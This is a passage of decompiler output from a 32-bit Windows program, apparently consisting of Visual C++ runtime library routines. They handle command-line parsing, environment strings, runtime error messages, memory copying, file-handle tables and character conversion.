      for (; *pbVar4 == 0x5c; pbVar4 = pbVar4 + 1) {
        uVar6 = uVar6 + 1;
      }
      if (*pbVar4 == 0x22) {
        pbVar5 = pbVar4;
        if ((uVar6 & 1) == 0) {
          if ((!bVar2) || (pbVar5 = pbVar4 + 1, pbVar4[1] != 0x22)) {
            bVar3 = false;
            pbVar5 = pbVar4;
          }
          bVar2 = !bVar2;
          ppbVar7 = param_2;
        }
        uVar6 = uVar6 >> 1;
        pbVar4 = pbVar5;
      }
      for (; uVar6 != 0; uVar6 = uVar6 - 1) {
        if (param_3 != (byte *)0x0) {
          *param_3 = 0x5c;
          param_3 = param_3 + 1;
        }
        *param_5 = *param_5 + 1;
      }
      bVar1 = *pbVar4;
      if ((bVar1 == 0) || ((!bVar2 && ((bVar1 == 0x20 || (bVar1 == 9)))))) break;
      if (bVar3) {
        if (param_3 == (byte *)0x0) {
          if (((&DAT_004255c1)[bVar1] & 4) != 0) {
            pbVar4 = pbVar4 + 1;
            *param_5 = *param_5 + 1;
          }
        }
        else {
          if (((&DAT_004255c1)[bVar1] & 4) != 0) {
            *param_3 = bVar1;
            param_3 = param_3 + 1;
            pbVar4 = pbVar4 + 1;
            *param_5 = *param_5 + 1;
          }
          *param_3 = *pbVar4;
          param_3 = param_3 + 1;
        }
        *param_5 = *param_5 + 1;
      }
      pbVar4 = pbVar4 + 1;
    }
    if (param_3 != (byte *)0x0) {
      *param_3 = 0;
      param_3 = param_3 + 1;
    }
    *param_5 = *param_5 + 1;
  }
  if (ppbVar7 != (byte **)0x0) {
    *ppbVar7 = (byte *)0x0;
  }
  *param_4 = *param_4 + 1;
  return;
}



undefined4 * FUN_0041bb0c(void)

{
  char cVar1;
  WCHAR WVar2;
  WCHAR *pWVar3;
  WCHAR *pWVar4;
  int iVar5;
  uint *puVar6;
  undefined4 *puVar7;
  LPWCH lpWideCharStr;
  undefined4 *puVar9;
  undefined4 *local_8;
  undefined4 *puVar8;
  
  lpWideCharStr = (LPWCH)0x0;
  puVar9 = (undefined4 *)0x0;
  if (DAT_00425464 == 0) {
    lpWideCharStr = GetEnvironmentStringsW();
    if (lpWideCharStr != (LPWCH)0x0) {
      DAT_00425464 = 1;
LAB_0041bb63:
      if ((lpWideCharStr == (LPWCH)0x0) &&
         (lpWideCharStr = GetEnvironmentStringsW(), lpWideCharStr == (LPWCH)0x0)) {
        return (undefined4 *)0x0;
      }
      WVar2 = *lpWideCharStr;
      pWVar4 = lpWideCharStr;
      while (WVar2 != L'\0') {
        do {
          pWVar3 = pWVar4;
          pWVar4 = pWVar3 + 1;
        } while (*pWVar4 != L'\0');
        pWVar4 = pWVar3 + 2;
        WVar2 = *pWVar4;
      }
      iVar5 = ((int)pWVar4 - (int)lpWideCharStr >> 1) + 1;
      puVar6 = (uint *)WideCharToMultiByte(0,0,lpWideCharStr,iVar5,(LPSTR)0x0,0,(LPCSTR)0x0,
                                           (LPBOOL)0x0);
      local_8 = (undefined4 *)0x0;
      if (((puVar6 != (uint *)0x0) &&
          (puVar9 = (undefined4 *)FUN_00415216(puVar6), puVar9 != (undefined4 *)0x0)) &&
         (iVar5 = WideCharToMultiByte(0,0,lpWideCharStr,iVar5,(LPSTR)puVar9,(int)puVar6,(LPCSTR)0x0,
                                      (LPBOOL)0x0), local_8 = puVar9, iVar5 == 0)) {
        FUN_004150a9(puVar9);
        local_8 = (undefined4 *)0x0;
      }
      FreeEnvironmentStringsW(lpWideCharStr);
      return local_8;
    }
    puVar9 = (undefined4 *)GetEnvironmentStrings();
    if (puVar9 == (undefined4 *)0x0) {
      return (undefined4 *)0x0;
    }
    DAT_00425464 = 2;
  }
  else {
    if (DAT_00425464 == 1) goto LAB_0041bb63;
    if (DAT_00425464 != 2) {
      return (undefined4 *)0x0;
    }
  }
  if ((puVar9 == (undefined4 *)0x0) &&
     (puVar9 = (undefined4 *)GetEnvironmentStrings(), puVar9 == (undefined4 *)0x0)) {
    return (undefined4 *)0x0;
  }
  cVar1 = *(char *)puVar9;
  puVar7 = puVar9;
  while (cVar1 != '\0') {
    do {
      puVar8 = puVar7;
      puVar7 = (undefined4 *)((int)puVar8 + 1);
    } while (*(char *)puVar7 != '\0');
    puVar7 = (undefined4 *)((int)puVar8 + 2);
    cVar1 = *(char *)puVar7;
  }
  puVar6 = (uint *)((int)puVar7 + (1 - (int)puVar9));
  puVar7 = (undefined4 *)FUN_00415216(puVar6);
  if (puVar7 == (undefined4 *)0x0) {
    puVar7 = (undefined4 *)0x0;
  }
  else {
    FUN_00417960(puVar7,puVar9,(uint)puVar6);
  }
  FreeEnvironmentStringsA((LPCH)puVar9);
  return puVar7;
}



void FUN_0041bd05(int param_1)

{
  FUN_004159a2(*(int *)(param_1 + 0x18),*(int *)(param_1 + 0x1c));
  return;
}



void FUN_0041bd20(void)

{
  if ((DAT_00425224 == 1) || ((DAT_00425224 == 0 && (DAT_00408700 == 1)))) {
    FUN_0041bd59(0xfc);
    if (DAT_00425468 != (code *)0x0) {
      (*DAT_00425468)();
    }
    FUN_0041bd59(0xff);
  }
  return;
}



void __cdecl FUN_0041bd59(DWORD param_1)

{
  uint **ppuVar1;
  DWORD *pDVar2;
  DWORD DVar3;
  char *pcVar4;
  HANDLE hFile;
  int iVar5;
  uint *puVar6;
  undefined auStackY_1e3 [7];
  LPOVERLAPPED lpOverlapped;
  uint local_1a8 [65];
  uint local_a4 [40];
  
  iVar5 = 0;
  pDVar2 = &DAT_00408ea0;
  do {
    if (param_1 == *pDVar2) break;
    pDVar2 = pDVar2 + 2;
    iVar5 = iVar5 + 1;
  } while ((int)pDVar2 < 0x408f30);
  if (param_1 == (&DAT_00408ea0)[iVar5 * 2]) {
    if ((DAT_00425224 == 1) || ((DAT_00425224 == 0 && (DAT_00408700 == 1)))) {
      pDVar2 = &param_1;
      ppuVar1 = (uint **)(iVar5 * 8 + 0x408ea4);
      lpOverlapped = (LPOVERLAPPED)0x0;
      pcVar4 = FUN_004194b0(*ppuVar1);
      puVar6 = *ppuVar1;
      hFile = GetStdHandle(0xfffffff4);
      WriteFile(hFile,puVar6,(DWORD)pcVar4,pDVar2,lpOverlapped);
    }
    else if (param_1 != 0xfc) {
      DVar3 = GetModuleFileNameA((HMODULE)0x0,(LPSTR)local_1a8,0x104);
      if (DVar3 == 0) {
        FUN_0041a1d0(local_1a8,(uint *)"<program name unknown>");
      }
      puVar6 = local_1a8;
      pcVar4 = FUN_004194b0(local_1a8);
      if ((char *)0x3c < pcVar4 + 1) {
        pcVar4 = FUN_004194b0(local_1a8);
        puVar6 = (uint *)(pcVar4 + (int)auStackY_1e3);
        FUN_0041d750(puVar6,(uint *)&DAT_00401648,3);
      }
      FUN_0041a1d0(local_a4,(uint *)"Runtime Error!\n\nProgram: ");
      FUN_0041a1e0(local_a4,puVar6);
      FUN_0041a1e0(local_a4,(uint *)&DAT_00401628);
      FUN_0041a1e0(local_a4,*(uint **)(iVar5 * 8 + 0x408ea4));
      auStackY_1e3._3_4_ = 0x41be7d;
      FUN_0041d9d9(local_a4,"Microsoft Visual C++ Runtime Library",0x12010);
    }
  }
  return;
}



undefined4 * __cdecl FUN_0041beb0(undefined4 *param_1,undefined4 *param_2,uint param_3)

{
  uint uVar1;
  uint uVar2;
  undefined4 *puVar3;
  undefined4 *puVar4;
  
  if ((param_2 < param_1) && (param_1 < (undefined4 *)(param_3 + (int)param_2))) {
    puVar3 = (undefined4 *)((param_3 - 4) + (int)param_2);
    puVar4 = (undefined4 *)((param_3 - 4) + (int)param_1);
    if (((uint)puVar4 & 3) == 0) {
      uVar1 = param_3 >> 2;
      uVar2 = param_3 & 3;
      if (7 < uVar1) {
        for (; uVar1 != 0; uVar1 = uVar1 - 1) {
          *puVar4 = *puVar3;
          puVar3 = puVar3 + -1;
          puVar4 = puVar4 + -1;
        }
        switch(uVar2) {
        case 0:
          return param_1;
        case 2:
          goto switchD_0041c067_caseD_2;
        case 3:
          goto switchD_0041c067_caseD_3;
        }
        goto switchD_0041c067_caseD_1;
      }
    }
    else {
      switch(param_3) {
      case 0:
        goto switchD_0041c067_caseD_0;
      case 1:
        goto switchD_0041c067_caseD_1;
      case 2:
        goto switchD_0041c067_caseD_2;
      case 3:
        goto switchD_0041c067_caseD_3;
      default:
        uVar1 = param_3 - ((uint)puVar4 & 3);
        switch((uint)puVar4 & 3) {
        case 1:
          uVar2 = uVar1 & 3;
          *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar3 + 3);
          puVar3 = (undefined4 *)((int)puVar3 + -1);
          uVar1 = uVar1 >> 2;
          puVar4 = (undefined4 *)((int)puVar4 - 1);
          if (7 < uVar1) {
            for (; uVar1 != 0; uVar1 = uVar1 - 1) {
              *puVar4 = *puVar3;
              puVar3 = puVar3 + -1;
              puVar4 = puVar4 + -1;
            }
            switch(uVar2) {
            case 0:
              return param_1;
            case 2:
              goto switchD_0041c067_caseD_2;
            case 3:
              goto switchD_0041c067_caseD_3;
            }
            goto switchD_0041c067_caseD_1;
          }
          break;
        case 2:
          uVar2 = uVar1 & 3;
          *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar3 + 3);
          uVar1 = uVar1 >> 2;
          *(undefined *)((int)puVar4 + 2) = *(undefined *)((int)puVar3 + 2);
          puVar3 = (undefined4 *)((int)puVar3 + -2);
          puVar4 = (undefined4 *)((int)puVar4 - 2);
          if (7 < uVar1) {
            for (; uVar1 != 0; uVar1 = uVar1 - 1) {
              *puVar4 = *puVar3;
              puVar3 = puVar3 + -1;
              puVar4 = puVar4 + -1;
            }
            switch(uVar2) {
            case 0:
              return param_1;
            case 2:
              goto switchD_0041c067_caseD_2;
            case 3:
              goto switchD_0041c067_caseD_3;
            }
            goto switchD_0041c067_caseD_1;
          }
          break;
        case 3:
          uVar2 = uVar1 & 3;
          *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar3 + 3);
          *(undefined *)((int)puVar4 + 2) = *(undefined *)((int)puVar3 + 2);
          uVar1 = uVar1 >> 2;
          *(undefined *)((int)puVar4 + 1) = *(undefined *)((int)puVar3 + 1);
          puVar3 = (undefined4 *)((int)puVar3 + -3);
          puVar4 = (undefined4 *)((int)puVar4 - 3);
          if (7 < uVar1) {
            for (; uVar1 != 0; uVar1 = uVar1 - 1) {
              *puVar4 = *puVar3;
              puVar3 = puVar3 + -1;
              puVar4 = puVar4 + -1;
            }
            switch(uVar2) {
            case 0:
              return param_1;
            case 2:
              goto switchD_0041c067_caseD_2;
            case 3:
              goto switchD_0041c067_caseD_3;
            }
            goto switchD_0041c067_caseD_1;
          }
        }
      }
    }
    switch(uVar1) {
    case 7:
      puVar4[7 - uVar1] = puVar3[7 - uVar1];
    case 6:
      puVar4[6 - uVar1] = puVar3[6 - uVar1];
    case 5:
      puVar4[5 - uVar1] = puVar3[5 - uVar1];
    case 4:
      puVar4[4 - uVar1] = puVar3[4 - uVar1];
    case 3:
      puVar4[3 - uVar1] = puVar3[3 - uVar1];
    case 2:
      puVar4[2 - uVar1] = puVar3[2 - uVar1];
    case 1:
      puVar4[1 - uVar1] = puVar3[1 - uVar1];
      puVar3 = puVar3 + -uVar1;
      puVar4 = puVar4 + -uVar1;
    }
    switch(uVar2) {
    case 1:
switchD_0041c067_caseD_1:
      *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar3 + 3);
      return param_1;
    case 2:
switchD_0041c067_caseD_2:
      *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar3 + 3);
      *(undefined *)((int)puVar4 + 2) = *(undefined *)((int)puVar3 + 2);
      return param_1;
    case 3:
switchD_0041c067_caseD_3:
      *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar3 + 3);
      *(undefined *)((int)puVar4 + 2) = *(undefined *)((int)puVar3 + 2);
      *(undefined *)((int)puVar4 + 1) = *(undefined *)((int)puVar3 + 1);
      return param_1;
    }
switchD_0041c067_caseD_0:
    return param_1;
  }
  puVar3 = param_1;
  if (((uint)param_1 & 3) == 0) {
    uVar1 = param_3 >> 2;
    uVar2 = param_3 & 3;
    if (7 < uVar1) {
      for (; uVar1 != 0; uVar1 = uVar1 - 1) {
        *puVar3 = *param_2;
        param_2 = param_2 + 1;
        puVar3 = puVar3 + 1;
      }
      switch(uVar2) {
      case 0:
        return param_1;
      case 2:
        goto switchD_0041bee5_caseD_2;
      case 3:
        goto switchD_0041bee5_caseD_3;
      }
      goto switchD_0041bee5_caseD_1;
    }
  }
  else {
    switch(param_3) {
    case 0:
      goto switchD_0041bee5_caseD_0;
    case 1:
      goto switchD_0041bee5_caseD_1;
    case 2:
      goto switchD_0041bee5_caseD_2;
    case 3:
      goto switchD_0041bee5_caseD_3;
    default:
      uVar1 = (param_3 - 4) + ((uint)param_1 & 3);
      switch((uint)param_1 & 3) {
      case 1:
        uVar2 = uVar1 & 3;
        *(undefined *)param_1 = *(undefined *)param_2;
        *(undefined *)((int)param_1 + 1) = *(undefined *)((int)param_2 + 1);
        uVar1 = uVar1 >> 2;
        *(undefined *)((int)param_1 + 2) = *(undefined *)((int)param_2 + 2);
        param_2 = (undefined4 *)((int)param_2 + 3);
        puVar3 = (undefined4 *)((int)param_1 + 3);
        if (7 < uVar1) {
          for (; uVar1 != 0; uVar1 = uVar1 - 1) {
            *puVar3 = *param_2;
            param_2 = param_2 + 1;
            puVar3 = puVar3 + 1;
          }
          switch(uVar2) {
          case 0:
            return param_1;
          case 2:
            goto switchD_0041bee5_caseD_2;
          case 3:
            goto switchD_0041bee5_caseD_3;
          }
          goto switchD_0041bee5_caseD_1;
        }
        break;
      case 2:
        uVar2 = uVar1 & 3;
        *(undefined *)param_1 = *(undefined *)param_2;
        uVar1 = uVar1 >> 2;
        *(undefined *)((int)param_1 + 1) = *(undefined *)((int)param_2 + 1);
        param_2 = (undefined4 *)((int)param_2 + 2);
        puVar3 = (undefined4 *)((int)param_1 + 2);
        if (7 < uVar1) {
          for (; uVar1 != 0; uVar1 = uVar1 - 1) {
            *puVar3 = *param_2;
            param_2 = param_2 + 1;
            puVar3 = puVar3 + 1;
          }
          switch(uVar2) {
          case 0:
            return param_1;
          case 2:
            goto switchD_0041bee5_caseD_2;
          case 3:
            goto switchD_0041bee5_caseD_3;
          }
          goto switchD_0041bee5_caseD_1;
        }
        break;
      case 3:
        uVar2 = uVar1 & 3;
        *(undefined *)param_1 = *(undefined *)param_2;
        param_2 = (undefined4 *)((int)param_2 + 1);
        uVar1 = uVar1 >> 2;
        puVar3 = (undefined4 *)((int)param_1 + 1);
        if (7 < uVar1) {
          for (; uVar1 != 0; uVar1 = uVar1 - 1) {
            *puVar3 = *param_2;
            param_2 = param_2 + 1;
            puVar3 = puVar3 + 1;
          }
          switch(uVar2) {
          case 0:
            return param_1;
          case 2:
            goto switchD_0041bee5_caseD_2;
          case 3:
            goto switchD_0041bee5_caseD_3;
          }
          goto switchD_0041bee5_caseD_1;
        }
      }
    }
  }
                    // WARNING: Could not find normalized switch variable to match jumptable
  switch(uVar1) {
  case 0x1c:
  case 0x1d:
  case 0x1e:
  case 0x1f:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar3[uVar1 - 7] = param_2[uVar1 - 7];
  case 0x18:
  case 0x19:
  case 0x1a:
  case 0x1b:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar3[uVar1 - 6] = param_2[uVar1 - 6];
  case 0x14:
  case 0x15:
  case 0x16:
  case 0x17:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar3[uVar1 - 5] = param_2[uVar1 - 5];
  case 0x10:
  case 0x11:
  case 0x12:
  case 0x13:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar3[uVar1 - 4] = param_2[uVar1 - 4];
  case 0xc:
  case 0xd:
  case 0xe:
  case 0xf:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar3[uVar1 - 3] = param_2[uVar1 - 3];
  case 8:
  case 9:
  case 10:
  case 0xb:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar3[uVar1 - 2] = param_2[uVar1 - 2];
  case 4:
  case 5:
  case 6:
  case 7:
    puVar3[uVar1 - 1] = param_2[uVar1 - 1];
    param_2 = param_2 + uVar1;
    puVar3 = puVar3 + uVar1;
  }
  switch(uVar2) {
  case 1:
switchD_0041bee5_caseD_1:
    *(undefined *)puVar3 = *(undefined *)param_2;
    return param_1;
  case 2:
switchD_0041bee5_caseD_2:
    *(undefined *)puVar3 = *(undefined *)param_2;
    *(undefined *)((int)puVar3 + 1) = *(undefined *)((int)param_2 + 1);
    return param_1;
  case 3:
switchD_0041bee5_caseD_3:
    *(undefined *)puVar3 = *(undefined *)param_2;
    *(undefined *)((int)puVar3 + 1) = *(undefined *)((int)param_2 + 1);
    *(undefined *)((int)puVar3 + 2) = *(undefined *)((int)param_2 + 2);
    return param_1;
  }
switchD_0041bee5_caseD_0:
  return param_1;
}



int FUN_0041c1e5(void)

{
  undefined4 *puVar1;
  undefined4 *puVar2;
  int *piVar3;
  int iVar4;
  int iVar5;
  int iVar6;
  
  iVar4 = -1;
  iVar6 = 0;
  iVar5 = 0;
  piVar3 = &DAT_00426700;
  do {
    puVar2 = (undefined4 *)*piVar3;
    if (puVar2 == (undefined4 *)0x0) {
      puVar2 = (undefined4 *)FUN_00415216((uint *)0x100);
      if (puVar2 != (undefined4 *)0x0) {
        DAT_00426800 = DAT_00426800 + 0x20;
        (&DAT_00426700)[iVar6] = puVar2;
        puVar1 = puVar2;
        for (; puVar2 < puVar1 + 0x40; puVar2 = puVar2 + 2) {
          *(undefined *)(puVar2 + 1) = 0;
          *puVar2 = 0xffffffff;
          *(undefined *)((int)puVar2 + 5) = 10;
          puVar1 = (undefined4 *)(&DAT_00426700)[iVar6];
        }
        iVar4 = iVar6 << 5;
      }
      return iVar4;
    }
    puVar1 = puVar2 + 0x40;
    for (; puVar2 < puVar1; puVar2 = puVar2 + 2) {
      if ((*(byte *)(puVar2 + 1) & 1) == 0) {
        *puVar2 = 0xffffffff;
        iVar4 = ((int)puVar2 - *piVar3 >> 3) + iVar5;
        if (iVar4 != -1) {
          return iVar4;
        }
        break;
      }
    }
    piVar3 = piVar3 + 1;
    iVar6 = iVar6 + 1;
    iVar5 = iVar5 + 0x20;
    if (0x4267ff < (int)piVar3) {
      return iVar4;
    }
  } while( true );
}



undefined4 __cdecl FUN_0041c27a(uint param_1,HANDLE param_2)

{
  int iVar1;
  DWORD nStdHandle;
  
  if (param_1 < DAT_00426800) {
    iVar1 = (param_1 & 0x1f) * 8;
    if (*(int *)((&DAT_00426700)[(int)param_1 >> 5] + iVar1) == -1) {
      if (DAT_00408700 == 1) {
        if (param_1 == 0) {
          nStdHandle = 0xfffffff6;
        }
        else if (param_1 == 1) {
          nStdHandle = 0xfffffff5;
        }
        else {
          if (param_1 != 2) goto LAB_0041c2d0;
          nStdHandle = 0xfffffff4;
        }
        SetStdHandle(nStdHandle,param_2);
      }
LAB_0041c2d0:
      *(HANDLE *)((&DAT_00426700)[(int)param_1 >> 5] + iVar1) = param_2;
      return 0;
    }
  }
  DAT_00425198 = 0;
  DAT_00425194 = 9;
  return 0xffffffff;
}



undefined4 __cdecl FUN_0041c2f1(uint param_1)

{
  int *piVar1;
  int iVar2;
  DWORD nStdHandle;
  
  if (param_1 < DAT_00426800) {
    iVar2 = (param_1 & 0x1f) * 8;
    piVar1 = (int *)((&DAT_00426700)[(int)param_1 >> 5] + iVar2);
    if (((*(byte *)(piVar1 + 1) & 1) != 0) && (*piVar1 != -1)) {
      if (DAT_00408700 == 1) {
        if (param_1 == 0) {
          nStdHandle = 0xfffffff6;
        }
        else if (param_1 == 1) {
          nStdHandle = 0xfffffff5;
        }
        else {
          if (param_1 != 2) goto LAB_0041c34a;
          nStdHandle = 0xfffffff4;
        }
        SetStdHandle(nStdHandle,(HANDLE)0x0);
      }
LAB_0041c34a:
      *(undefined4 *)((&DAT_00426700)[(int)param_1 >> 5] + iVar2) = 0xffffffff;
      return 0;
    }
  }
  DAT_00425198 = 0;
  DAT_00425194 = 9;
  return 0xffffffff;
}



undefined4 __cdecl FUN_0041c36b(uint param_1)

{
  if ((param_1 < DAT_00426800) &&
     ((*(byte *)((&DAT_00426700)[(int)param_1 >> 5] + 4 + (param_1 & 0x1f) * 8) & 1) != 0)) {
    return *(undefined4 *)((&DAT_00426700)[(int)param_1 >> 5] + (param_1 & 0x1f) * 8);
  }
  DAT_00425198 = 0;
  DAT_00425194 = 9;
  return 0xffffffff;
}



undefined4 __cdecl FUN_0041c3a8(uint param_1)

{
  HANDLE hFile;
  BOOL BVar1;
  DWORD DVar2;
  
  DVar2 = DAT_00425198;
  if ((param_1 < DAT_00426800) &&
     ((*(byte *)((&DAT_00426700)[(int)param_1 >> 5] + 4 + (param_1 & 0x1f) * 8) & 1) != 0)) {
    hFile = (HANDLE)FUN_0041c36b(param_1);
    BVar1 = FlushFileBuffers(hFile);
    if (BVar1 == 0) {
      DVar2 = GetLastError();
    }
    else {
      DVar2 = 0;
    }
    if (DVar2 == 0) {
      return 0;
    }
  }
  DAT_00425198 = DVar2;
  DAT_00425194 = 9;
  return 0xffffffff;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __cdecl FUN_0041c3ff(undefined4 *param_1)

{
  int iVar1;
  
  _DAT_00425240 = _DAT_00425240 + 1;
  iVar1 = FUN_00415216((uint *)0x1000);
  param_1[2] = iVar1;
  if (iVar1 == 0) {
    param_1[3] = param_1[3] | 4;
    param_1[2] = param_1 + 5;
    param_1[6] = 2;
  }
  else {
    param_1[3] = param_1[3] | 8;
    param_1[6] = 0x1000;
  }
  param_1[1] = 0;
  *param_1 = param_1[2];
  return;
}



byte __cdecl FUN_0041c443(uint param_1)

{
  if (DAT_00426800 <= param_1) {
    return 0;
  }
  return *(byte *)((&DAT_00426700)[(int)param_1 >> 5] + 4 + (param_1 & 0x1f) * 8) & 0x40;
}



LPSTR __cdecl FUN_0041c469(LPSTR param_1,WCHAR param_2)

{
  LPSTR pCVar1;
  
  pCVar1 = param_1;
  if (param_1 == (LPSTR)0x0) {
    return param_1;
  }
  if (DAT_00425250 == 0) {
    if ((ushort)param_2 < 0x100) {
      *param_1 = (CHAR)param_2;
      return (LPSTR)0x1;
    }
  }
  else {
    param_1 = (LPSTR)0x0;
    pCVar1 = (LPSTR)WideCharToMultiByte(DAT_00425260,0x220,&param_2,1,pCVar1,DAT_00408e0c,
                                        (LPCSTR)0x0,(LPBOOL)&param_1);
    if ((pCVar1 != (LPSTR)0x0) && (param_1 == (LPSTR)0x0)) {
      return pCVar1;
    }
  }
  DAT_00425194 = 0x2a;
  return (LPSTR)0xffffffff;
}



uint __cdecl FUN_0041c4d1(LPWSTR param_1,byte *param_2,uint param_3)

{
  byte bVar1;
  int iVar2;
  
  if ((param_2 != (byte *)0x0) && (param_3 != 0)) {
    bVar1 = *param_2;
    if (bVar1 != 0) {
      if (DAT_00425250 == 0) {
        if (param_1 != (LPWSTR)0x0) {
          *param_1 = (ushort)bVar1;
        }
        return 1;
      }
      if ((PTR_DAT_00408c00[(uint)bVar1 * 2 + 1] & 0x80) == 0) {
        iVar2 = MultiByteToWideChar(DAT_00425260,9,(LPCSTR)param_2,1,param_1,
                                    (uint)(param_1 != (LPWSTR)0x0));
        if (iVar2 != 0) {
          return 1;
        }
      }
      else {
        if (1 < (int)DAT_00408e0c) {
          if ((int)param_3 < (int)DAT_00408e0c) {
            DAT_00425194 = 0x2a;
            return 0xffffffff;
          }
          iVar2 = MultiByteToWideChar(DAT_00425260,9,(LPCSTR)param_2,DAT_00408e0c,param_1,
                                      (uint)(param_1 != (LPWSTR)0x0));
          if (iVar2 != 0) {
            return DAT_00408e0c;
          }
        }
        if ((DAT_00408e0c <= param_3) && (param_2[1] != 0)) {
          return DAT_00408e0c;
        }
      }
      DAT_00425194 = 0x2a;
      return 0xffffffff;
    }
    if (param_1 != (LPWSTR)0x0) {
      *param_1 = L'\0';
    }
  }
  return 0;
}



uint __thiscall FUN_0041c599(void *this,int param_1)

{
  uint uVar1;
  
  if (1 < DAT_00408e0c) {
    uVar1 = FUN_0041b5b5(this,param_1,8);
    return uVar1;
  }
  return (byte)PTR_DAT_00408c00[param_1 * 2] & 8;
}



longlong FUN_0041c5d0(uint param_1,uint param_2,uint param_3,uint param_4)

{
  if ((param_4 | param_2) == 0) {
    return (ulonglong)param_1 * (ulonglong)param_3;
  }
  return CONCAT44((int)((ulonglong)param_1 * (ulonglong)param_3 >> 0x20) +
                  param_2 * param_3 + param_1 * param_4,
                  (int)((ulonglong)param_1 * (ulonglong)param_3));
}



longlong __fastcall FUN_0041c610(byte param_1,int param_2)

{
  uint in_EAX;
  
  if (0x3f < param_1) {
    return 0;
  }
  if (param_1 < 0x20) {
    return CONCAT44(param_2 << (param_1 & 0x1f) | in_EAX >> 0x20 - (param_1 & 0x1f),
                    in_EAX << (param_1 & 0x1f));
  }
  return (ulonglong)(in_EAX << (param_1 & 0x1f)) << 0x20;
}



uint __cdecl FUN_0041c62f(uint param_1,char **param_2)

{
  char *pcVar1;
  
  if ((param_1 != 0xffffffff) &&
     ((pcVar1 = param_2[3], ((uint)pcVar1 & 1) != 0 ||
      ((((uint)pcVar1 & 0x80) != 0 && (((uint)pcVar1 & 2) == 0)))))) {
    if (param_2[2] == (char *)0x0) {
      FUN_0041c3ff(param_2);
    }
    if (*param_2 == param_2[2]) {
      if (param_2[1] != (char *)0x0) {
        return 0xffffffff;
      }
      *param_2 = *param_2 + 1;
    }
    if ((*(byte *)(param_2 + 3) & 0x40) == 0) {
      *param_2 = *param_2 + -1;
      **param_2 = (char)param_1;
    }
    else {
      *param_2 = *param_2 + -1;
      if (**param_2 != (char)param_1) {
        *param_2 = *param_2 + 1;
        return 0xffffffff;
      }
    }
    param_2[1] = param_2[1] + 1;
    param_2[3] = (char *)((uint)param_2[3] & 0xffffffef | 1);
    return param_1 & 0xff;
  }
  return 0xffffffff;
}



int __thiscall FUN_0041c69d(void *this,int **param_1)

{
  int *piVar1;
  bool bVar2;
  int iVar3;
  undefined3 extraout_var;
  
  piVar1 = *param_1;
  if (((*piVar1 == -0x1f928c9d) && (piVar1[4] == 3)) && (piVar1[5] == 0x19930520)) {
    iVar3 = FUN_00419ddc((int)this);
    return iVar3;
  }
  if ((DAT_0042546c != (FARPROC)0x0) &&
     (bVar2 = FUN_0041c739(DAT_0042546c), CONCAT31(extraout_var,bVar2) != 0)) {
    iVar3 = (*DAT_0042546c)(param_1);
    return iVar3;
  }
  return 0;
}



bool __cdecl FUN_0041c701(void *param_1,UINT_PTR param_2)

{
  BOOL BVar1;
  
  BVar1 = IsBadReadPtr(param_1,param_2);
  return BVar1 == 0;
}



bool __cdecl FUN_0041c71d(LPVOID param_1,UINT_PTR param_2)

{
  BOOL BVar1;
  
  BVar1 = IsBadWritePtr(param_1,param_2);
  return BVar1 == 0;
}



bool __cdecl FUN_0041c739(FARPROC param_1)

{
  BOOL BVar1;
  
  BVar1 = IsBadCodePtr(param_1);
  return BVar1 == 0;
}



int __cdecl FUN_0041c760(undefined4 *param_1,byte *param_2)

{
  undefined2 uVar1;
  undefined4 uVar2;
  byte bVar3;
  byte bVar4;
  bool bVar5;
  
  if (((uint)param_1 & 3) != 0) {
    if (((uint)param_1 & 1) != 0) {
      bVar4 = *(byte *)param_1;
      param_1 = (undefined4 *)((int)param_1 + 1);
      bVar5 = bVar4 < *param_2;
      if (bVar4 != *param_2) goto LAB_0041c7a4;
      param_2 = param_2 + 1;
      if (bVar4 == 0) {
        return 0;
      }
      if (((uint)param_1 & 2) == 0) goto LAB_0041c770;
    }
    uVar1 = *(undefined2 *)param_1;
    param_1 = (undefined4 *)((int)param_1 + 2);
    bVar4 = (byte)uVar1;
    bVar5 = bVar4 < *param_2;
    if (bVar4 != *param_2) goto LAB_0041c7a4;
    if (bVar4 == 0) {
      return 0;
    }
    bVar4 = (byte)((ushort)uVar1 >> 8);
    bVar5 = bVar4 < param_2[1];
    if (bVar4 != param_2[1]) goto LAB_0041c7a4;
    if (bVar4 == 0) {
      return 0;
    }
    param_2 = param_2 + 2;
  }
LAB_0041c770:
  while( true ) {
    uVar2 = *param_1;
    bVar4 = (byte)uVar2;
    bVar5 = bVar4 < *param_2;
    if (bVar4 != *param_2) break;
    if (bVar4 == 0) {
      return 0;
    }
    bVar4 = (byte)((uint)uVar2 >> 8);
    bVar5 = bVar4 < param_2[1];
    if (bVar4 != param_2[1]) break;
    if (bVar4 == 0) {
      return 0;
    }
    bVar4 = (byte)((uint)uVar2 >> 0x10);
    bVar5 = bVar4 < param_2[2];
    if (bVar4 != param_2[2]) break;
    bVar3 = (byte)((uint)uVar2 >> 0x18);
    if (bVar4 == 0) {
      return 0;
    }
    bVar5 = bVar3 < param_2[3];
    if (bVar3 != param_2[3]) break;
    param_2 = param_2 + 4;
    param_1 = param_1 + 1;
    if (bVar3 == 0) {
      return 0;
    }
  }
LAB_0041c7a4:
  return (uint)bVar5 * -2 + 1;
}



int FUN_0041c7e4(DWORD param_1,byte *param_2,int param_3,byte *param_4,int param_5,UINT param_6)

{
  undefined *puVar1;
  int iVar2;
  int iVar3;
  BOOL BVar4;
  BYTE *pBVar5;
  undefined unaff_DI;
  undefined4 *unaff_FS_OFFSET;
  LCID unaff_retaddr;
  _cpinfo _Stack_44;
  undefined *puStack_30;
  PCNZWCH pWStack_2c;
  int iStack_28;
  int iStack_24;
  undefined *puStack_20;
  undefined4 uStack_18;
  undefined *puStack_14;
  undefined *puStack_10;
  undefined4 uStack_c;
  
  FUN_0041bd59(10);
  uStack_c = 0x41c7f2;
  FUN_0041da6b(0x16);
  FUN_00415edd(3);
  uStack_c = 0xffffffff;
  puStack_10 = &DAT_00401668;
  puStack_14 = &LAB_0041bc48;
